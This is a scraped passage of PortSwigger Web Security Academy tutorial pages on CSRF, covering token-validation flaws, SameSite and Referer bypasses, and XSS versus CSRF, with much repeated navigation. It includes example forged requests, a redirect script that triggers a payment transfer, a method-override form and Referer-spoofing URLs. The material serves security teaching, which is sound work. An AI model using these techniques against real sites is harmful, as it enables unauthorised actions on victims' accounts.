attacks?](https://portswigger.net/web-security/csrf/xss-vs-csrf#can-csrf-tokens-prevent-xss-attacks)\n*   [Constructing an attack](https://portswigger.net/web-security/csrf#how-to-construct-a-csrf-attack)\n*   [Delivering an exploit](https://portswigger.net/web-security/csrf#how-to-deliver-a-csrf-exploit)\n*   [Defences](https://portswigger.net/web-security/csrf#common-defences-against-csrf)\n*    [Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)\n    *   [What is a CSRF token?](https://portswigger.net/web-security/csrf/bypassing-token-validation#what-is-a-csrf-token)\n    *    [Flaws in CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation#common-flaws-in-csrf-token-validation)\n        *   [Validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation#validation-of-csrf-token-depends-on-request-method)\n        *   [Validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation#validation-of-csrf-token-depends-on-token-being-present)\n        *   [Token isn't tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-not-tied-to-the-user-session)\n        *   [Token is tied to a non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-tied-to-a-non-session-cookie)\n        *   [Token is duplicated in a cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-simply-duplicated-in-a-cookie)\n*    [Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)\n    *   [What is a site?](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-is-a-site-in-the-context-of-samesite-cookies)\n    *   [Site vs origin](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-s-the-difference-between-a-site-and-an-origin)\n    *    [How does SameSite work?](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#how-does-samesite-work)\n        *   [Strict restriction level](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#strict)\n        *   [Lax restriction level](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax)\n        *   [No SameSite restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none)\n    *   [Bypassing Lax restrictions using GET requests](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests)\n    *   [Bypassing restrictions using on-site gadgets](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-using-on-site-gadgets)\n    *   [Bypassing restrictions via vulnerable sibling domains](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-via-vulnerable-sibling-domains)\n    *   [Bypassing Lax restrictions with newly issued cookies](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-with-newly-issued-cookies)\n*    [Bypassing Referer-based CSRF defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)\n    *   [Validation of Referer depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present)\n    *   [Validation of Referer can be circumvented](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-can-be-circumvented)\n*    [Preventing CSRF vulnerabilities](https://portswigger.net/web-security/csrf/preventing)\n    *    [CSRF tokens](https://portswigger.net/web-security/csrf/preventing#use-csrf-tokens)\n        *   [Generating](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-generated)\n        *   [Transmitting](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-transmitted)\n        *   [Validating](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-validated)\n    *   [Strict SameSite cookie restrictions](https://portswigger.net/web-security/csrf/preventing#use-strict-samesite-cookie-restrictions)\n    *   [Be wary of cross-origin, same-site attacks](https://portswigger.net/web-security/csrf/preventing#be-wary-of-cross-origin-same-site-attacks)\n*   [View all CSRF labs](https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [CSRF](https://portswigger.net/web-security/csrf)\n*   [XSS vs CSRF](https://portswigger.net/web-security/csrf/xss-vs-csrf)\n\nXSS vs CSRF\n===========\n\nIn this section, we'll explain the differences between XSS and [CSRF](https://portswigger.net/web-security/csrf), and discuss whether CSRF tokens can help to prevent XSS attacks.\n\nWhat is the difference between XSS and CSRF?\n--------------------------------------------\n\n[Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user.\n\n[Cross-site request forgery](https://portswigger.net/web-security/csrf) (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.\n\nThe consequences of XSS vulnerabilities are generally more serious than for CSRF vulnerabilities:\n\n*   CSRF often only applies to a subset of actions that a user is able to perform. Many applications implement CSRF defenses in general but overlook one or two actions that are left exposed. Conversely, a successful XSS exploit can normally induce a user to perform any action that the user is able to perform, regardless of the functionality in which the vulnerability arises.\n*   CSRF can be described as a \"one-way\" vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request. Conversely, XSS is \"two-way\", in that the attacker's injected script can issue arbitrary requests, read the responses, and exfiltrate data to an external domain of the attacker's choosing.\n\nCan CSRF tokens prevent XSS attacks?\n------------------------------------\n\nSome XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability that can be trivially exploited like this:\n\n`https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>`Now, suppose that the vulnerable function includes a CSRF token:\n\n`https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>`Assuming that the server properly validates the CSRF token, and rejects requests without a valid token, then the token does prevent exploitation of the XSS vulnerability. The clue here is in the name: \"cross-site scripting\", at least in its [reflected](https://portswigger.net/web-security/cross-site-scripting/reflected) form, involves a cross-site request. By preventing an attacker from forging a cross-site request, the application prevents trivial exploitation of the XSS vulnerability.\n\nSome important caveats arise here:\n\n*   If a reflected XSS vulnerability exists anywhere else on the site within a function that is not protected by a CSRF token, then that XSS can be exploited in the normal way.\n*   If an exploitable XSS vulnerability exists anywhere on a site, then the vulnerability can be leveraged to make a victim user perform actions even if those actions are themselves protected by CSRF tokens. In this situation, the attacker's script can request the relevant page to obtain a valid CSRF token, and then use the token to perform the protected action.\n*   CSRF tokens do not protect against [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerabilities. If a page that is protected by a CSRF token is also the output point for a stored XSS vulnerability, then that XSS vulnerability can be exploited in the usual way, and the XSS payload will execute when a user visits the page.\n\n", "category": "CSRF"}, {"title": "Bypassing CSRF token validation", "content": "#### Note\n\nCSRF tokens don't have to be sent as hidden parameters in a `POST` request. Some applications place CSRF tokens in HTTP headers, for example. The way in which tokens are transmitted has a significant impact on the security of a mechanism as a whole. For more information, see [How to prevent CSRF vulnerabilities](https://portswigger.net/web-security/csrf/preventing).\n\nCommon flaws in CSRF token validation\n-------------------------------------\n\nCSRF vulnerabilities typically arise due to flawed validation of CSRF tokens. In this section, we'll cover some of the most common issues that enable attackers to bypass these defenses.\n\n### Validation of CSRF token depends on request method\n\nSome applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.\n\nIn this situation, the attacker can switch to the GET method to bypass the validation and deliver a [CSRF attack](https://portswigger.net/web-security/csrf):\n\n```\nGET /email/change?email=pwned@evil-user.net HTTP/1.1\nHost: vulnerable-website.com\nCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm\n```\n\n### Validation of CSRF token depends on token being present\n\nSome applications correctly validate the token when it is present but skip the validation if the token is omitted.\n\nIn this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:\n\n```\nPOST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\nCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm\n\nemail=pwned@evil-user.net\n```\n\n### CSRF token is not tied to the user session\n\nSome applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.\n\nIn this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.\n\n### CSRF token is tied to a non-session cookie\n\nIn a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:\n\n```\nPOST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nCookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv\n\ncsrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com\n```\n\nThis situation is harder to exploit but is still vulnerable. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.\n\n#### Note\n\nThe cookie-setting behavior does not even need to exist within the same web application as the [CSRF vulnerability](https://portswigger.net/web-security/csrf). Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.\n\n### CSRF token is simply duplicated in a cookie\n\nIn a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the \"double submit\" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state:\n\n```\nPOST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nCookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa\n\ncsrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com\n```\n\nIn this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.\n", "category": "CSRF"}, {"title": "Bypassing SameSite cookie restrictions", "content": "#### Note\n\nYou may come across the term \"effective top-level domain\" (eTLD). This is just a way of accounting for the reserved multipart suffixes that are treated as top-level domains in practice, such as `.co.uk`.\n\nWhat's the difference between a site and an origin?\n---------------------------------------------------\n\nThe difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications.\n\nTwo URLs are considered to have the same origin if they share the exact same scheme, domain name, and port. Although note that the port is often inferred from the scheme.\n\n![Site vs origin](https://portswigger.net/web-security/csrf/images/site-vs-origin.png)\n\nAs you can see from this example, the term \"site\" is much less specific as it only accounts for the scheme and last part of the domain name. Crucially, this means that a cross-origin request can still be same-site, but not the other way around.\n\n**Request from**\n\n**Request to**\n\n**Same-site?**\n\n**Same-origin?**\n\n`https://example.com`\n\n`https://example.com`\n\nYes\n\nYes\n\n`https://app.example.com`\n\n`https://intranet.example.com`\n\nYes\n\nNo: mismatched domain name\n\n`https://example.com`\n\n`https://example.com:8080`\n\nYes\n\nNo: mismatched port\n\n`https://example.com`\n\n`https://example.co.uk`\n\nNo: mismatched eTLD\n\nNo: mismatched domain name\n\n`https://example.com`\n\n`http://example.com`\n\nNo: mismatched scheme\n\nNo: mismatched scheme\n\nThis is an important distinction as it means that any vulnerability enabling arbitrary JavaScript execution can be abused to bypass site-based defenses on other domains belonging to the same site. We'll see an example of this in one of the labs later.\n\nHow does SameSite work?\n-----------------------\n\nBefore the SameSite mechanism was introduced, browsers sent cookies in every request to the domain that issued them, even if the request was triggered by an unrelated third-party website. SameSite works by enabling browsers and website owners to limit which cross-site requests, if any, should include specific cookies. This can help to reduce users' exposure to CSRF attacks, which induce the victim's browser to issue a request that triggers a harmful action on the vulnerable website. As these requests typically require a cookie associated with the victim's authenticated session, the attack will fail if the browser doesn't include this.\n\nAll major browsers currently support the following SameSite restriction levels:\n\n*   [`Strict`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#strict)\n*   [`Lax`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax)\n*   [`None`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none)\n\nDevelopers can manually configure a restriction level for each cookie they set, giving them more control over when these cookies are used. To do this, they just have to include the `SameSite` attribute in the `Set-Cookie` response header, along with their preferred value:\n\n`Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`\n\nAlthough this offers some protection against CSRF attacks, none of these restrictions provide guaranteed immunity, as we'll demonstrate using deliberately vulnerable, interactive labs later in this section.\n\n#### Note\n\nIf the website issuing the cookie doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior. As this is a proposed new standard, we expect other major browsers to adopt this behavior in future.\n\n### Strict\n\nIf a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.\n\nThis is recommended when setting cookies that enable the bearer to modify data or perform other sensitive actions, such as accessing specific pages that are only available to authenticated users.\n\nAlthough this is the most secure option, it can negatively impact the user experience in cases where cross-site functionality is desirable.\n\n### Lax\n\n`Lax` SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:\n\n*   The request uses the `GET` method.\n    \n*   The request resulted from a top-level navigation by the user, such as clicking on a link.\n    \n\nThis means that the cookie is not included in cross-site `POST` requests, for example. As `POST` requests are generally used to perform actions that modify data or state (at least according to best practice), they are much more likely to be the target of CSRF attacks.\n\nLikewise, the cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.\n\n### None\n\nIf a cookie is set with the `SameSite=None` attribute, this effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites.\n\nWith the exception of Chrome, this is the default behavior used by major browsers if no `SameSite` attribute is provided when setting the cookie.\n\nThere are legitimate reasons for disabling SameSite, such as when the cookie is intended to be used from a third-party context and doesn't grant the bearer access to any sensitive data or functionality. Tracking cookies are a typical example.\n\nIf you encounter a cookie set with `SameSite=None` or with no explicit restrictions, it's worth investigating whether it's of any use. When the \"Lax-by-default\" behavior was first adopted by Chrome, this had the side-effect of breaking a lot of existing web functionality. As a quick workaround, some websites have opted to simply disable SameSite restrictions on all cookies, including potentially sensitive ones.\n\nWhen setting a cookie with `SameSite=None`, the website must also include the `Secure` attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.\n\n`Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`\n\nBypassing SameSite Lax restrictions using GET requests\n------------------------------------------------------\n\nIn practice, servers aren't always fussy about whether they receive a `GET` or `POST` request to a given endpoint, even those that are expecting a form submission. If they also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a [CSRF attack](https://portswigger.net/web-security/csrf) by eliciting a `GET` request from the victim's browser.\n\nAs long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the simplest approaches to launching such an attack:\n\n```\n<script>\n    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';\n</script>\n```\n\nEven if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:\n\n```\n<form action=\"https://vulnerable-website.com/account/transfer-payment\" method=\"POST\">\n    <input type=\"hidden\" name=\"_method\" value=\"GET\">\n    <input type=\"hidden\" name=\"recipient\" value=\"hacker\">\n    <input type=\"hidden\" name=\"amount\" value=\"1000000\">\n</form>\n```\n\nOther frameworks support a variety of similar parameters.\n\nBypassing SameSite restrictions using on-site gadgets\n-----------------------------------------------------\n\nIf a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.\n\nOne possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. For some examples, see our materials on [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection).\n\nAs far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.\n\nIf you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.\n\nNote that the equivalent attack is not possible with server-side redirects. In this case, browsers recognize that the request to follow the redirect resulted from a cross-site request initially, so they still apply the appropriate cookie restrictions.\n\nBypassing SameSite restrictions via vulnerable sibling domains\n--------------------------------------------------------------\n\nWhether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin.\n\nMake sure you thoroughly audit all of the available attack surface, including any sibling domains. In particular, vulnerabilities that enable you to elicit an arbitrary secondary request, such as [XSS](https://portswigger.net/web-security/cross-site-scripting), can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks.\n\nIn addition to classic CSRF, don't forget that if the target website supports WebSockets, this functionality might be vulnerable to [cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)), which is essentially just a CSRF attack targeting a WebSocket handshake. For more details, see our topic on [WebSocket vulnerabilities](https://portswigger.net/web-security/websockets).\n\nBypassing SameSite Lax restrictions with newly issued cookies\n-------------------------------------------------------------\n\nCookies with `Lax` SameSite restrictions aren't normally sent in any cross-site `POST` requests, but there are some exceptions.\n\nAs mentioned earlier, if a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies `Lax` restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.\n\n#### Note\n\nThis two-minute window does not apply to cookies that were explicitly set with the `SameSite=Lax` attribute.\n\nIt's somewhat impractical to try timing the attack to fall within this short window. On the other hand, if you can find a gadget on the site that enables you to force the victim to be issued a new session cookie, you can preemptively refresh their cookie before following up with the main attack. For example, completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site.\n\nTo trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.\n\nAlternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default:\n\n`window.open('https://vulnerable-website.com/login/sso');`\n\nTo get around this, you can wrap the statement in an `onclick` event handler as follows:\n\n```\nwindow.onclick = () => {\n    window.open('https://vulnerable-website.com/login/sso');\n}\n```\n\nThis way, the `window.open()` method is only invoked when the user clicks somewhere on the page.\n", "category": "CSRF"}, {"title": "Bypassing Referer-based CSRF defenses", "content": "### Cross-site request forgery (CSRF)\n\n*   [What is CSRF?](https://portswigger.net/web-security/csrf#what-is-csrf)\n*   [Impact](https://portswigger.net/web-security/csrf#what-is-the-impact-of-a-csrf-attack)\n*   [How does CSRF work?](https://portswigger.net/web-security/csrf#how-does-csrf-work)\n*    [XSS vs CSRF](https://portswigger.net/web-security/csrf/xss-vs-csrf)\n    *   [Can CSRF tokens prevent XSS attacks?](https://portswigger.net/web-security/csrf/xss-vs-csrf#can-csrf-tokens-prevent-xss-attacks)\n*   [Constructing an attack](https://portswigger.net/web-security/csrf#how-to-construct-a-csrf-attack)\n*   [Delivering an exploit](https://portswigger.net/web-security/csrf#how-to-deliver-a-csrf-exploit)\n*   [Defences](https://portswigger.net/web-security/csrf#common-defences-against-csrf)\n*    [Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)\n    *   [What is a CSRF token?](https://portswigger.net/web-security/csrf/bypassing-token-validation#what-is-a-csrf-token)\n    *    [Flaws in CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation#common-flaws-in-csrf-token-validation)\n        *   [Validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation#validation-of-csrf-token-depends-on-request-method)\n        *   [Validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation#validation-of-csrf-token-depends-on-token-being-present)\n        *   [Token isn't tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-not-tied-to-the-user-session)\n        *   [Token is tied to a non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-tied-to-a-non-session-cookie)\n        *   [Token is duplicated in a cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-simply-duplicated-in-a-cookie)\n*    [Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)\n    *   [What is a site?](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-is-a-site-in-the-context-of-samesite-cookies)\n    *   [Site vs origin](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-s-the-difference-between-a-site-and-an-origin)\n    *    [How does SameSite work?](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#how-does-samesite-work)\n        *   [Strict restriction level](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#strict)\n        *   [Lax restriction level](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax)\n        *   [No SameSite restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none)\n    *   [Bypassing Lax restrictions using GET requests](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests)\n    *   [Bypassing restrictions using on-site gadgets](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-using-on-site-gadgets)\n    *   [Bypassing restrictions via vulnerable sibling domains](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-via-vulnerable-sibling-domains)\n    *   [Bypassing Lax restrictions with newly issued cookies](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-with-newly-issued-cookies)\n*    [Bypassing Referer-based CSRF defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)\n    *   [Validation of Referer depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present)\n    *   [Validation of Referer can be circumvented](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-can-be-circumvented)\n*    [Preventing CSRF vulnerabilities](https://portswigger.net/web-security/csrf/preventing)\n    *    [CSRF tokens](https://portswigger.net/web-security/csrf/preventing#use-csrf-tokens)\n        *   [Generating](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-generated)\n        *   [Transmitting](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-transmitted)\n        *   [Validating](https://portswigger.net/web-security/csrf/preventing#how-should-csrf-tokens-be-validated)\n    *   [Strict SameSite cookie restrictions](https://portswigger.net/web-security/csrf/preventing#use-strict-samesite-cookie-restrictions)\n    *   [Be wary of cross-origin, same-site attacks](https://portswigger.net/web-security/csrf/preventing#be-wary-of-cross-origin-same-site-attacks)\n*   [View all CSRF labs](https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [CSRF](https://portswigger.net/web-security/csrf)\n*   [Bypassing Referer-based CSRF defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)\n\nBypassing Referer-based CSRF defenses\n=====================================\n\nAside from defenses that employ CSRF tokens, some applications make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.\n\n#### Referer header\n\nThe HTTP Referer header (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form. Various methods exist that allow the linking page to withhold or modify the value of the `Referer` header. This is often done for privacy reasons.\n\nValidation of Referer depends on header being present\n-----------------------------------------------------\n\nSome applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted.\n\nIn this situation, an attacker can craft their [CSRF exploit](https://portswigger.net/web-security/csrf) in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the [CSRF attack](https://portswigger.net/web-security/csrf):\n\n`<meta name=\"referrer\" content=\"never\">`\n\nLAB\n\nPRACTITIONER [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)\n\nValidation of Referer can be circumvented\n-----------------------------------------\n\nSome applications validate the `Referer` header in a naive way that can be bypassed. For example, if the application validates that the domain in the `Referer` starts with the expected value, then the attacker can place this as a subdomain of their own domain:\n\n`http://vulnerable-website.com.attacker-website.com/csrf-attack`Likewise, if the application simply validates that the `Referer` contains its own domain name, then the attacker can place the required value elsewhere in the URL:\n\n`http://attacker-website.com/csrf-attack?vulnerable-website.com`\n\n#### Note\n\nAlthough you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the `Referer` header by default.\n\nYou can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that `Referrer` is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.\n\nLAB\n\nPRACTITIONER [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)\n\n", "category": "CSRF"}, {"title": "Preventing CSRF vulnerabilities", "content": "### Cross-site request forgery (CSRF)\n\n*   [What is CSRF?](https://portswigger.net/web-security/csrf#what-is-csrf)\n*   [Impact](https://portswigger.net/web-security/csrf#what-is-the-impact-of-a-csrf-attack)\n*   [How does CSRF work?](https://portswigger.net/web-security/csrf#how-does-csrf-work)\n*    [XSS vs CSRF](https://portswigger.net/web-security/csrf/xss-vs-csrf)\n    *   [Can CSRF tokens prevent XSS attacks?](https://portswigger.net/web-security/csrf/xss-vs-csrf#can-csrf-tokens-prevent-xss-attacks)\n*   [Constructing an attack](https://portswigger.net/web-security/csrf#how-to-construct-a-csrf-attack)\n*   [Delivering an exploit](https://portswigger.net/web-security/csrf#how-to-deliver-a-csrf-exploit)\n*   [Defences](https://portswigger.net/web-security/csrf#common-defences-against-csrf)\n*    [Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)\n    *   [What is a CSRF token?](https://portswigger.net/web-security/csrf/bypassing-token-validation#what-is-a-csrf-token)\n    *    [Flaws in CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation#common-flaws-in-csrf-token-validation)\n        *   [Validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation#validation-of-csrf-token-depends-on-request-method)\n        *   [Validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation#validation-of-csrf-token-depends-on-token-being-present)\n        *   [Token isn't tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-not-tied-to-the-user-session)\n        *   [Token is tied to a non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-tied-to-a-non-session-cookie)\n        *   [Token is duplicated in a cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation#csrf-token-is-simply-duplicated-in-a-cookie)\n*    [Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)\n    *   [What is a site?](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-is-a-site-in-the-context-of-samesite-cookies)\n    *   [Site vs origin](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-s-the-difference-between-a-site-and-an-origin)\n    *    [How does SameSite work?](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#how-does-samesite-work)\n        *   [Strict restriction level](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#strict)\n        *   [Lax restriction level](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax)\n        *   [No SameSite restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none)\n    *   [Bypassing Lax restrictions using GET requests](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests)\n    *   [Bypassing restrictions using on-site gadgets](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-using-on-site-gadgets)\n    *   [Bypassing restrictions via vulnerable sibling domains](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-via-vulnerable-sibling-domains)\n    *   [Bypassing Lax restrictions with newly issued 